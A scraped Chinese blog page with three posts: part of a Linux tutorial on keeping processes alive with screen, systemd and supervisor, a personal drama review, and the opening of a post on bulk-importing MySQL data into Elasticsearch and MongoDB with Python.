<h3 id="setsid"><a href="#setsid" class="headerlink" title="setsid"></a>setsid</h3><p><code>nohup</code>是通过忽略SIGHUP来保持运行的，那咱能不能直接让<code>ping</code>不属于当前会话，自然也就收不到关闭终端时给进程组发的SIGHUP了？能啊怎么不能呢，<code>setsid</code>啊，用例如下：</p>
<p>setsid ping z.cn</p>
<p>此时<code>pstree</code>和上面是一样的，<code>ps</code>能够看到他的父进程是init，（init：我就是万年备胎，专门收垃圾）</p>
<p><img src="/images/2017120708054548.png"></p>
<h3 id="disown"><a href="#disown" class="headerlink" title="disown"></a>disown</h3><p>如果一不小心程序已经运行了，那么该怎么补救呢？</p>
<p>答案是使用<code>disown</code>来控制作业（jobs），举例：</p>
<p>sleep 100<br>disown -h %1</p>
<p>关闭终端之后依旧会持续运行，只是不能用<code>jobs</code>控制了（但应该能用盖茨控制）。</p>
<p>感觉似乎以上方法都不太好，要么查看输出太费事，要么用起来很别扭，那有什么更好的办法吗？当然了！</p>
<h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>是个非常强大的工具，大概就是模拟VT100&#x2F;ANSI的窗口管理器。说不明白了。反正我大概是这么用的：</p>
<p>screen -S dl</p>
<p>做一点事情……</p>
<p>要回来的时候，<code>screen -r dl</code>就回到了终端关闭之前的界面。</p>
<p>关掉终端，咱能看到进程树是init-&gt;screen-&gt;bash-&gt;ping</p>
<p><img src="/images/2017120708054725.png"></p>
<h2 id="某天我写了个程序"><a href="#某天我写了个程序" class="headerlink" title="某天我写了个程序"></a>某天我写了个程序</h2><p>某天我写了个程序，想让它永不停息，于是乎我用了screen，然后某一天这个程序抛异常了，然后我screen回去看了一眼继续启动；某天服务器重启了，我进去再screen……周而复始，这个程序名字叫做<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot">ExpressBot</a>，烦不烦呐！！</p>
<p>所以咱得让这个程序成为服务。顺便说一句，比如说你要是官方二进制的MongoDB、MySQL，那么用systemd或者supervisor守护下也是非常好的选择。</p>
<h2 id="使用systemd"><a href="#使用systemd" class="headerlink" title="使用systemd"></a>使用systemd</h2><p>systemd是Linux下最流行的init，由Lennart Poettering带头开发。发音不是system d，而是System Five Hundred 因为D是罗马数字里的500.</p>
<p>Lennart：<a target="_blank" rel="noopener" href="https://linux.cn/article-3978-1.html">我就是想怼你们的教皇</a>。</p>
<h3 id="命令概述"><a href="#命令概述" class="headerlink" title="命令概述"></a>命令概述</h3><p>关于systemd，Arch Linux有一篇写的<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">非常详尽的wiki</a>，我们要想给自己的程序做成服务，通常是要添加单元（unit），单元可以是系统服务（.service）、挂载点（.mount）、sockets（.sockets） 、系统设备（.device）、交换分区（.swap）、文件路径（.path）、启动目标（.target）、由 systemd 管理的计时器（.timer）。如果没有扩展名，那么就会被当作服务，比如说sshd和sshd.service就是一个意思。</p>
<p>system的主要命令是<code>systemctl</code>，常用的服务相关命令有<code>start</code>，<code>stop</code>，<code>restart</code>，<code>reload</code>，<code>status</code>，<code>enable</code>，<code>disable</code>，<code>mask</code>（禁用），<code>unmask</code>（取消禁用），<code>daemon-reload</code>，举例（需要root权限）：</p>
<p>#立即启动单元：<br>systemctl start &lt;单元&gt;<br>#重新载入 systemd，扫描新的或有变动的单元，在修改了单元文件之后是非常必要的：<br>systemctl daemon-reload<br>#一些其他命令举例：</p>
<h1 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h1><p>systemctl reboot</p>
<h1 id="关闭系统，切断电源"><a href="#关闭系统，切断电源" class="headerlink" title="关闭系统，切断电源"></a>关闭系统，切断电源</h1><p>systemctl poweroff<br>#查看启动耗时<br>systemd-analyze<br>#显示某个 Unit 是否正在运行(一般用于脚本判断)<br>systemctl is-active sshd.service<br>#修改单元<br>systemctl edit –full sshd.service</p>
<h3 id="systemd单元加载路径"><a href="#systemd单元加载路径" class="headerlink" title="systemd单元加载路径"></a>systemd单元加载路径</h3><p>单元文件是有一定的加载顺序的，先加载<code>/etc/system/system</code>，然后是<code>/run/systemd/system</code>，最后是<code>/lib/systemd/system</code>，如下图所示：</p>
<p><img src="/images/2017120708054810.png"></p>
<h3 id="service示例：Unit"><a href="#service示例：Unit" class="headerlink" title="service示例：Unit"></a>service示例：Unit</h3><p>一个配置文件可以分为unit、service、install 这几个模块。</p>
<p>unit定义描述、启动顺序、依赖等，</p>
<p><code>Description</code>给出当前服务的简单描述，<code>Documentation</code>字段给出文档路径；</p>
<p><code>After</code>和<code>Before</code>指定启动顺序（只是顺序，不是依赖），比如说如果在网络服务之后启动，那么就应该写成</p>
<p>After&#x3D;network.target</p>
<p>依赖关系，需要使用<code>Wants</code>和<code>Requires</code></p>
<p><code>Wants</code>表示依赖关系是可选的；<code>Requires</code>依赖关系是必须的，如果被依赖的服务启动失败或异常退出，那么依赖者也必须退出。</p>
<h3 id="service示例：service"><a href="#service示例：service" class="headerlink" title="service示例：service"></a>service示例：service</h3><ul>
<li>Exec</li>
</ul>
<p>service中最重要的就是<code>ExecStart</code>，定义启动进程时执行的命令，需要使用绝对路径，类似的还有<code>ExecReload</code>（重启服务时执行）、<code>ExecStop</code>（停止服务时执行）、<code>ExecStartPre</code>（启动服务之前执行）、<code>ExecStartPost</code>（启动服务之后执行）、<code>ExecStopPost</code>（停止服务之后执行）</p>
<ul>
<li>Type</li>
</ul>
<p>Type定义启动类型，有好多种，比如说<code>simple</code>、<code>forking</code>、<code>oneshot</code>……</p>
<p>咱一般用<code>simple</code>比较多，意思是<code>ExecStart</code>字段启动的进程为主进程。</p>
<ul>
<li>KillMode</li>
</ul>
<p>KillMode：定义 如何停止服务，有<code>control-group、process、mixed、none</code></p>
<p>control-group（默认值）：当前控制组里面的所有子进程，都会被杀掉</p>
<p>process：只杀主进程，会话保留</p>
<p>mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号</p>
<p>none：没有进程会被杀掉，只是执行服务的 stop 命令。</p>
<p>我们来看下sshd的配置：</p>
<p><img src="/images/2017120708054918.png"></p>
<p>知道为什么sshd服务关了，当前连接还不断吧。</p>
<ul>
<li>Restart</li>
</ul>
<p>Restart定义重启字段，有这么几个值：<code>on、always、on-success、on-failure、on-abnormal、on-abort、on-watching</code>，具体详情如下表：</p>
<p><img src="/images/2017120708055089.png"></p>
<p>还有一个<code>RestartSec</code>，指的是重启服务之前等待几秒。</p>
<ul>
<li>Environment</li>
</ul>
<p><code>Environment</code>定义环境变量。一个比较坑的地方是systemd无法读取<code>/etc/profile</code>,<code>.bashrc</code>等环境变量，systemd启动的服务也读取不到这些环境变量（知道为啥用绝对路径了吧），有这么几种解决方案：</p>
<p>1.修改systemd配置文件，使得环境变量在所有单元中可见</p>
<p>在 <code>/etc/systemd/user.conf</code>文件中使用 <code>DefaultEnvironment</code> 选项。</p>
<p>2.修改单元配置文件，使得环境变量在用户单元中可见</p>
<p><code>systemctl edit --full expressbot.service</code>（或者找到对应的文件路径，比如说<code>/lib/system/system/expressbot.service</code>） 下增加配置文件设置。</p>
<ol>
<li>导入变量</li>
</ol>
<p>在任何时候， 使用 <code>systemctl --user set-environment</code> 或 <code>systemctl --user import-environment</code>. 对设置之后启动的所有用户单元有效，但已经启动的用户单元不会生效。</p>
<p>例子：</p>
<p>[Service]<br>Environment&#x3D;”TOKEN&#x3D;12345”<br>Environment&#x3D;”DB_PATH&#x3D;&#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;bot.db”<br>Environment&#x3D;”TURING_KEY&#x3D;111111”<br>Environment&#x3D;”DEBUG&#x3D;0”</p>
<p>Restart&#x3D;always<br>Type&#x3D;simple<br>ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py</p>
<p>此时在这个python脚本中就可以用<code>os.environ.get(&#39;DEBUG&#39;)</code>来获取到环境变量啦（类型全部为字符串）。其实这种方式也方便更新，不用再merge了。</p>
<h3 id="service示例：install"><a href="#service示例：install" class="headerlink" title="service示例：install"></a>service示例：install</h3><p><code>install</code>就比较简单了，就是定义什么情况下启动。</p>
<p>比如说<code>WantedBy=multi-user.target</code>就意味着在多用户环境下会启动，<code>WantedBy= graphical.target</code>表示图形用户下启动。</p>
<h3 id="完整配置文件："><a href="#完整配置文件：" class="headerlink" title="完整配置文件："></a>完整配置文件：</h3><p>[Unit]<br>Description&#x3D;A Telegram Bot for querying expresses<br>After&#x3D;network.target network-online.target nss-lookup.target</p>
<p>[Service]<br>Environment&#x3D;”TOKEN&#x3D;12345”<br>Environment&#x3D;”DB_PATH&#x3D;&#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;bot.db”<br>Environment&#x3D;”TURING_KEY&#x3D;111111”<br>Environment&#x3D;”DEBUG&#x3D;0”<br>Restart&#x3D;always<br>Type&#x3D;simple<br>ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py</p>
<p>[Install]<br>WantedBy&#x3D;multi-user.target</p>
<p>更多详情可以<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html">参考这里</a></p>
<h2 id="不好玩的轮子"><a href="#不好玩的轮子" class="headerlink" title="不好玩的轮子"></a>不好玩的轮子</h2><p>在以前，我是怎么检测服务是否还在运行的呢……</p>
<p>基本思路是，<code>pidof</code>能获取到运行中的进程的id，然后根据<code>$?</code>判断是否还在运行，比如说……</p>
<p>pidof php-fpm &gt;&#x2F;dev&#x2F;null<br>if [ $? -eq 0 ] ; then<br>    echo “It is running.”<br>else<br>    echo “At `date` PHP Server was stopped”&gt;&gt; &#x2F;home&#x2F;wwwlogs&#x2F;service_log<br>fi</p>
<p>然后加入到crontab中（值得一提的是，systemd也有个timer，类似于crontab，可以参考<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">Arch</a>“ \l “.E6.9B.BF.E4.BB.A3_cron) <a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">L</a>“ \l “.E6.9B.BF.E4.BB.A3_cron)<a target="_blank" rel="noopener" href="https://wiki.archlinux.org/index.php/Systemd/Timers_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">inux</a>“ \l “.E6.9B.BF.E4.BB.A3_cron)）。</p>
<p>这样做其实不是很理想，最长可能会导致服务中断近一分钟，这绝对是莱洛三角形。</p>
<p>所以，直接给Restart字段一个<code>on-abnormal</code>或者<code>on-failure</code>就好了嘛。 [v_blue]思考一下：cron最短时间周期是一分钟一次，我就想十秒钟一次，该怎么办？[&#x2F;v_blue]</p>
<h2 id="systemd的优缺点"><a href="#systemd的优缺点" class="headerlink" title="systemd的优缺点"></a>systemd的优缺点</h2><p>systemd的功能十分强大，配置文件也好写，而且systemd比较稳定（它要是挂了，那系统就挂了）。但是有一点可能不太好，就是并不是所有系统的init都是systemd（systemd争议有点大），比如说Ubuntu 14.04就不是（16.04是，跟上游Debian），Devuan（一个不用systemd的Debian）。哦对了，systemd看日志感觉不是那么方便</p>
<p>另一个备选方案是supervisor，python咱都有吧……</p>
<h2 id="Supervisor"><a href="#Supervisor" class="headerlink" title="Supervisor"></a>Supervisor</h2><p>Supervisor 是一个用 Python 写的进程管理工具，可以很方便的用来启动、重启、关闭进程（不仅仅是 Python 进程）。</p>
<p>先用pip安装:</p>
<p>pip install supervisor</p>
<h3 id="配置supervisord"><a href="#配置supervisord" class="headerlink" title="配置supervisord"></a>配置supervisord</h3><p>同样，supervisor也有一个配置文件优先路径，<code>$CWD/supervisord.conf</code> &gt; <code>$CWD/etc/supervisord.conf</code> &gt; <code>/etc/supervisord.conf</code>，</p>
<p>我一般会创建一个<code>/etc/supervisord.conf</code>，然后创建一个<code>/etc/supervisor/SomeService.conf</code>,然后在<code>/etc/supervisord.conf</code>中包含后者。</p>
<p>如下创建默认配置：</p>
<p>echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf</p>
<p>最后一行包含配置：</p>
<p>[include]<br>files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;*.conf</p>
<p>然后创建如下“单元”：</p>
<p>[program:expressbot]<br>directory &#x3D; &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py<br>command &#x3D; &#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;ExpressBot&#x2F;expressbot&#x2F;main.py<br>autostart &#x3D; true ; 在 supervisord 启动的时候也自动启动<br>startsecs &#x3D; 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了<br>autorestart &#x3D; true ; 程序异常退出后自动重启<br>startretries &#x3D; 3 ; 启动失败自动重试次数，默认是 3<br>user &#x3D; root ; 用哪个用户启动<br>redirect_stderr &#x3D; true ; 把 stderr 重定向到 stdout，默认 false<br>stdout_logfile_maxbytes &#x3D; 20MB ; stdout 日志文件大小，默认 50MB<br>stdout_logfile_backups &#x3D; 20 ; stdout 日志文件备份数<br>stdout_logfile &#x3D; &#x2F;var&#x2F;log&#x2F;expressbot_stdout.log ;日志文件</p>
<p>然后运行supervisord就可以启动supervisor啦。</p>
<h3 id="控制supervisor"><a href="#控制supervisor" class="headerlink" title="控制supervisor"></a>控制supervisor</h3><p>类似systemd，supervisor也有个<code>supervictl</code>（配置文件查找顺序与supervisord一样），直接输入会进入交互模式，命令主要有：</p>
<p>status、stop、restart、reread（读取有更新新增的配置文件，不会启动新添加的程序）、update（重启配置文件修改过的程序），示例：</p>
<p><img src="/images/2017120708055254.png"></p>
<p>或者直接在bash下<code>supervisorctl restart WebTerminal</code>也是可以的。</p>
<p>注意：有的时候更新配置文件会没用，此时就要<code>supervisorctl reload</code>啦。</p>
<h2 id="supervisor优缺点"><a href="#supervisor优缺点" class="headerlink" title="supervisor优缺点"></a>supervisor优缺点</h2><p>相比systemd，supervisor的特点是精准、小而全，毕竟systemd是大管家嘛；supervisor跨平台，不受init的限制；supervisor提供一个Web页面，使用用户名密码的基本身份验证（在<code>/etc/supervisord.conf</code>中配置）。</p>
<p>最大的缺点就是，万一我手残kill了supervisord，那也就完蛋啦~可是我要是kill了init呢……没用的，你杀不掉的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/12/07/linux-keep-running/index/" data-id="clhp7rthc004ls2qra3mg1sm6" data-title="Linux怎么让程序持续运行：简单说说几种好玩的办法" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hiramasa-mikuri/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/11/20/hiramasa-mikuri/index/" class="article-date">
  <time class="dt-published" datetime="2017-11-20T00:00:00.000Z" itemprop="datePublished">2017-11-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/11/20/hiramasa-mikuri/index/">平匡与实栗</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>本来我是最不擅长写剧评影评的，但是看到这么让我这么有认同感的一部剧，感觉哪怕说不出点什么，也要留个脚印吧。好吧，先丢个人人影视的链接：<a target="_blank" rel="noopener" href="http://www.zimuzu.tv/resource/34812">戳我</a>、<a target="_blank" rel="noopener" href="http://xiazai003.com/ZqCA2">戳我</a>、<a target="_blank" rel="noopener" href="https://pastebin.com/Zg0mPhy3">戳我</a></p>
<p>[netmusic play&#x3D;’0’]448917334[&#x2F;netmusic]</p>
<h2 id="莫名其妙"><a href="#莫名其妙" class="headerlink" title="莫名其妙"></a>莫名其妙</h2><p>差不多一年前，在人人影视公众号上看到了这么一条推送<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s/BYjujIyjKEb-AQCrvgsUvg">《让新垣结衣说出“如果是和你做那件事，我可以”的男人是个什么样子》</a>，然后我就给收藏起来了。</p>
<p>差不多一年之后的今天，偶然在推上看到了一个妹子的十年长图，又因为一些莫名其妙的可笑的原因看了<a target="_blank" rel="noopener" href="http://www.zimuzu.tv/resource/34596">《心有所属》</a>，然后想起了好像曾经收藏过什么，然后就……<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012494597.jpg"><img src="/images/2017112012494597.jpg"></a></p>
<h2 id="津崎平匡与森山实栗"><a href="#津崎平匡与森山实栗" class="headerlink" title="津崎平匡与森山实栗"></a>津崎平匡与森山实栗</h2><p>津崎平匡，（PHP）程序员，技术水平一流，逻辑分明、条理清晰的单身达人。</p>
<p>森山实栗，研究生毕业，失业，每天都在“不被任何人需要” 的痛苦中备受煎熬。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012502119.jpg"><img src="/images/2017112012502119.jpg"></a></p>
<h2 id="被需要"><a href="#被需要" class="headerlink" title="被需要"></a>被需要</h2><p>人们都希望被别人需要  却往往事与愿违  一点一点放弃自己的想法  想哭的时候一笑了之  或许  人们都是这样生活下去的</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/897651719785545728">其实我觉得，自己对别人来说是重要的，被别人需要的，是一种很美好的感觉的……</a></p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012515042.jpg"><img src="/images/2017112012515042.jpg"></a></p>
<p> </p>
<h2 id="认同感"><a href="#认同感" class="headerlink" title="认同感"></a>认同感</h2><p>在《影响力》中有段话大概是这样的：</p>
<p>我们喜欢与自己相似的人，不管相似之处是在观点、个性、背景还是生活方式上，我们总会有这样的倾向。</p>
<p>所以这可能是过去的差不多一年里我又开心又难过还很纠结的原因。</p>
<p>这也是我喜欢这部剧的原因之一，我也是一名程序员，与平匡<strong>有一些</strong>比较相似的地方。原因之二当然是因为ガッキー的盛世美颜啦，其实ガッキー演技也很不错，尤其是EP06电车上那段，飙泪&#x2F;(ㄒoㄒ)&#x2F;~</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012521745.jpg"><img src="/images/2017112012521745-1024x577.jpg"></a></p>
<p>电车上的你，一点点的表情都在说着难过。你说你放弃了，累了，什么也不做，什么也不求。一边的眼睛湿润了，流泪了，车到站了，笑着说，我们走吧。</p>
<p>平匡：这次旅行结束后，我们就要回到一周拥抱一次的雇主与雇员关系了,一如往常</p>
<p>实栗：一如往常就好，我放弃了。我累了，什么也不做，什么也不求。这次旅行结束，就回归平稳的日常生活，还有一站</p>
<p>平匡：还有一站</p>
<p>实栗：还有…一站</p>
<p>如果永远都不会到……就好了</p>
<h2 id="我喜欢你"><a href="#我喜欢你" class="headerlink" title="我喜欢你"></a>我喜欢你</h2><p>因为是平匡，所以我才可以。</p>
<p>你为什么要说这样的话，这样会让我越来越喜欢你啊。所以我才讨厌这样，只有我在单相思。要是你也喜欢我就好了。<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012525020.jpg"><img src="/images/2017112012525020-1024x576.jpg"></a></p>
<p>这可不行，对我来说你已经不是轻易地可以去放弃的人。</p>
<h2 id="周二是拥抱日"><a href="#周二是拥抱日" class="headerlink" title="周二是拥抱日"></a>周二是拥抱日</h2><p>从那天之后，拥抱日就不存在了。因为每天都随心而抱。一旦冷淡下来，手也不会碰，什么都没有。</p>
<p>平匡深爱着的是一个可以把家务做到完美总能以笑容相待的理想妻子，而不是一个仅仅因为米饭就翻脸的女人。</p>
<p>希望被选中，希望得到认可，然而我却与理想中的自己渐行渐远了。<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012532877.jpg"><img src="/images/2017112012532877-1024x576.jpg"></a> 这就是我想要的生活……可是也只能是幻想了?</p>
<h2 id="几个小问题"><a href="#几个小问题" class="headerlink" title="几个小问题"></a>几个小问题</h2><h3 id="PHP程序员"><a href="#PHP程序员" class="headerlink" title="PHP程序员"></a>PHP程序员</h3><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012543067.jpg"><img src="/images/2017112012543067-1024x768.jpg"></a>平匡，你这样改掉超全局变量，真的好吗？不是不可以，但是咱一般都把$_POST放到表达式右面的。</p>
<h3 id="左手写字"><a href="#左手写字" class="headerlink" title="左手写字"></a>左手写字</h3><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012543117.jpg"><img src="/images/2017112012543117-1024x576.jpg"></a>左手写字！！</p>
<h3 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h3><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012543299.jpg"><img src="/images/2017112012543299.jpg"></a>OpenOffice嗯……还有书架上的书……绝对是个大大大大牛！！</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>一直在逃避……从不敢面对。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/2017112012543356.jpg"><img src="/images/2017112012543356-1024x576.jpg"></a></p>
<p>???</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/11/20/hiramasa-mikuri/index/" data-id="clhp7rtgo003ps2qr2hjddxx7" data-title="平匡与实栗" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-mysql-es-mongo/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/11/03/mysql-es-mongo/index/" class="article-date">
  <time class="dt-published" datetime="2017-11-03T00:00:00.000Z" itemprop="datePublished">2017-11-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/11/03/mysql-es-mongo/index/">使用Python将海量MySQL数据导入Elastic Search/MongoDB</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[audio play&#x3D;’0’]话说啊，几天之前，我接到了这么一个任务，就是把<strong>大量</strong>MySQL的数据导入到Elastic Search中，再久之前我还有个把数据导入到MongoDB中。MongoDB和ES本身还是比较接近的，只不过这次导入到ES的<strong>数据量非常大</strong>，最大的表大概有<strong>4GiB</strong>左右，咱得必须想点方法优化一下这个导入过程。</p>
<p>当然了，凡是涉及到对海量数据进行处理的，都可以用本篇提到的思路进行处理。</p>
<p>咱先说说思路。咋办捏？最笨的办法哈，从MySQL中读取一行，根据列名转换成对应形式的字典，然后插入到MongoDB&#x2F;ES中，然后再读一行，转换，插入，直到读取完。这样吧，说实话，效率是有点低，但是也能完成任务对吧。包括俺的mentor、还有其他Python的专家们，都反对俺这种<strong>读一行写一行</strong>的处理方式。</p>
<p>其实啊，我也知道<code>insert_many()</code>、<code>executemany()</code>和<code>writelines()</code>这种批量的方法，另一种思路呢，就是把数据存到一个列表里，然后迭代批量操作。但是怎奈我都是处理很大的数据的，如果一下子把这些东西塞到内存里，怕是没等运行完呢，就Memory Error或者发生大量的swap交换再Kernel Panic了吧。</p>
<p>当然了，第二种思路其实是能够有办法完成的，要不我写这篇文章是干嘛的！</p>
<p>当然了，咱要先从导入少量数据开始。</p>
<h2 id="导入少量数据到MongoDB"><a href="#导入少量数据到MongoDB" class="headerlink" title="导入少量数据到MongoDB"></a>导入少量数据到MongoDB</h2><p>废话少说，直接贴以前的代码。太懒了，直接贴图了。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/11/110317_1444_PythonMySQ1.png"><img src="/images/110317_1444_PythonMySQ1.png"></a></p>
<p>大概就是这么回事，逻辑非常简单明了。</p>
<p><code>data = cur.fetchall()</code>将数据库表中的内容（结果集）<strong>一下子</strong>塞到内存里，其形式为列表内套元组，然后下面根据它的长度进行循环，以此进行构造字典、调用插入，直到不满足循环条件。</p>
<p>当然了，大家看我注释能发现，pymongo还是有些坑的，比如说就关于<code>Duplicate Key Error</code>这个错误，如果把<code>mongo_dic</code>这个变量写到循环外面，那就要用<code>copy()</code>浅拷贝来让驱动生成不同的<code>_id</code>，如果放在循环里，那么每次每次循环驱动都会生成不同的<code>_id</code>啦。</p>
<p>这种做法有何问题呢？有很多</p>
<h3 id="一行一个操作效率太低"><a href="#一行一个操作效率太低" class="headerlink" title="一行一个操作效率太低"></a>一行一个操作效率太低</h3><p>这可能是这种做法最大的问题了，效率太低，对数据库压力也不小，唯一开心的是内存了。</p>
<h3 id="无法快速重用代码"><a href="#无法快速重用代码" class="headerlink" title="无法快速重用代码"></a>无法快速重用代码</h3><p>假如某一天我想导入另一个数据表，列很有可能是不同的，那么构造字典这一块就要推倒重来，很难做到快速<strong>重用代码</strong>。况且，用<code>update()</code>方法来构造字典好像不是那么常见，咱都是<code>mongo_dic=dict(key1=value1,key2=value2)</code>的。</p>
<h3 id="无法处理大量数据"><a href="#无法处理大量数据" class="headerlink" title="无法处理大量数据"></a>无法处理大量数据</h3><p>咦？咱开篇不是说到，一行一行的读是可以处理大量数据只不过效率偏低。</p>
<p>没错啊，但是那是指的使用<code>fetchone()</code>，<code>fetchmany()</code>这种方法。在这个demo里我图省事用了<code>fetchall()</code>，如果表太大，内存就炸了。想要改进，那就得放到一个while循环里用<code>fetchone()</code>，这里就不用演示了，估计有点基础的人都能分分钟写出来。</p>
<h3 id="其他小问题"><a href="#其他小问题" class="headerlink" title="其他小问题"></a>其他小问题</h3><p>什么docstring写的不对，不Pythonic，try…except不规范等等等就不用说了。我后来还写了一个OOP的版本。反正这玩意是，<strong>能用，但是性能太差</strong>，不好用；糊弄小盆友可以，工作上用就等着被开除吧（尽管我mentor说，嗯这次代码写得很干净，很不错，但是咱怎么能知足呢！）</p>
<h2 id="痛定思痛"><a href="#痛定思痛" class="headerlink" title="痛定思痛"></a>痛定思痛</h2><p>于是乎，在国庆假期之前，我被Python的多线程彻底坑了一次（<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%85%A8%E5%B1%80%E8%A7%A3%E9%87%8A%E5%99%A8%E9%94%81">GIL，全局解释器锁</a>），然后顺带着开始了熟悉Elastic Search（然而现在依旧什么都不会）；</p>
<p>然后在国庆假期之后，我的新任务就是熟悉ELK（Elastic Search+Logstash+Kibana），居然有一种大数据工程师的感觉。</p>
<p>然而我并没有抽出时间来熟悉这玩意，因为我<strong>忙着难过</strong>、写Telegram Bot、翻译、维护博客、维护两款主题来着</p>
<p>然后某一天，我就有了个小任务，要想办法把某个数据库里最大的4个表导入到另一台机器上的ES中。感受一下这13GiB的表……</p>
<p><img src="/images/110317_1444_PythonMySQ2.png"></p>
<h2 id="按着MongoDB的思路来"><a href="#按着MongoDB的思路来" class="headerlink" title="按着MongoDB的思路来"></a>按着MongoDB的思路来</h2><p>此路不太好走，内心深处的我纠结了很久才决定回头。</p>
<h3 id="构造四个字典"><a href="#构造四个字典" class="headerlink" title="构造四个字典"></a>构造四个字典</h3><p>我：这算啥事，哥哥小时候很穷，新衣服都穿不起，没少吃苦，这点算啥，哪怕是曾经138列，我都敢再来一次。为什么我的眼里常含泪水，因为我对你爱的深沉啊</p>
<p>某童鞋：你真无聊。</p>
<h3 id="fetchone读一行写一行"><a href="#fetchone读一行写一行" class="headerlink" title="fetchone读一行写一行"></a>fetchone读一行写一行</h3><p>我：效率是有点低，但是任务还是能完成的。</p>
<p>老板：你丫拿着工资不干正事，这效率太低了。</p>
<p>CPU：我XXXX。算了，我忍。</p>
<p>硬盘：你妹！你是测试我4K性能呢么？</p>
<p>Python：哎内存大哥，把这个放进去，哎把那个拿出来，哎把这个放进去给原来的拿走，哎给这个拿走。</p>
<p>内存：有完没完……(￣_￣|||)</p>
<h3 id="读到一个列表里，一起插入"><a href="#读到一个列表里，一起插入" class="headerlink" title="读到一个列表里，一起插入"></a>读到一个列表里，一起插入</h3><p>我：效率是高了点，就是不知道能不能行。</p>
<p>老板：嗯，看样子还是不错的哈……</p>
<p>内存：Python大哥你悠着点，我这才8G，你这表4G就占了一半了啊。</p>
<p>Python：内存大哥你放心，我保证<strong>把200MiB的表读入内存时就跟你要4G的地</strong>。</p>
<p>硬盘：我了割草内核你干啥突然要来写入&#x2F;swap，我这老胳膊老腿了，你有啥事找隔壁内存啊，<strong>我就是个备胎啊</strong>找你真爱内存去。</p>
<p>内核：我也很无奈啊，没办法了<strong>只有你能救我</strong>，我还是爱你的。哎，Python那家伙吃了太多内存，我等等看看要不要手起刀落施展生杀大权。</p>
<p>其他程序：喂喂喂 内核，我要I&#x2F;O，阻塞好久了！！快，快！一会主人逼急了断电了你负责么？</p>
<p>CPU：大家干啥呢那么热闹？</p>
<p>内核：大家别急，让我为民除害，杀了Python这个……<strong>负  心  汉</strong></p>
<p>Python：内核大哥，别别别，不是我的错，是我主人太太太…</p>
<p>主人：哎Python你干啥啊读200MiB的数据库跟人要4G的内存，造反啊</p>
<p>Kernel Panic了</p>
<p>神说要有光，就有了光。坐在椅子上的我仰天长笑（并做出一种<strong>神经病</strong>一样的诡异表情）：Let there be light.</p>
